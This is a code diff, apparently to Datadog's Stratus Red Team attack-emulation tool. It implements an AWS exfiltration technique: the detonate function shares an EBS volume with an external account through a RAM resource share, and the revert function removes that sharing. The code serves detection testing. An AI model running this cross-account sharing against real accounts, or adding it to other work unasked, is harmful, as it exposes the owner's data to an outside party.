@@ -1,7 +1,9 @@
 package aws
 
 import (
+	"context"
 	_ "embed"
+	"log"
 
 	"github.com/aws/aws-sdk-go-v2/service/ram"
 	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
@@ -55,9 +57,37 @@ func detonate(params map[string]string, providers stratus.CloudProviders) error 
 	// associate the EBS volume with the RAM resource share
 	ramClient := ram.NewFromConfig(providers.AWS().GetConnection())
 
+	volumeId := params["ebs_volume_arn"]
+	resourceShareArn := params["resource_share_arn"]
+
+	log.Println("Sharing the volume " + volumeId + " with an external AWS account...")
+	_, err := ramClient.AssociateResourceShare(context.Background(), &ram.AssociateResourceShareInput{
+		ResourceShareArn: &resourceShareArn,
+		ResourceArns:     []string{volumeId},
+		Principals:       []string{ShareWithAccountId},
+	})
+	if err != nil {
+		return err
+	}
+
 	return nil
 }
 
 func revert(params map[string]string, providers stratus.CloudProviders) error {
+	ramClient := ram.NewFromConfig(providers.AWS().GetConnection())
+
+	volumeId := params["ebs_volume_arn"]
+	resourceShareArn := params["resource_share_arn"]
+
+	log.Println("Reverting the sharing of the volume " + volumeId + " with the external AWS account...")
+	_, err := ramClient.DisassociateResourceShare(context.Background(), &ram.DisassociateResourceShareInput{
+		ResourceShareArn: &resourceShareArn,
+		ResourceArns:     []string{volumeId},
+		Principals:       []string{ShareWithAccountId},
+	})
+	if err != nil {
+		return err
+	}
+
 	return nil
 }
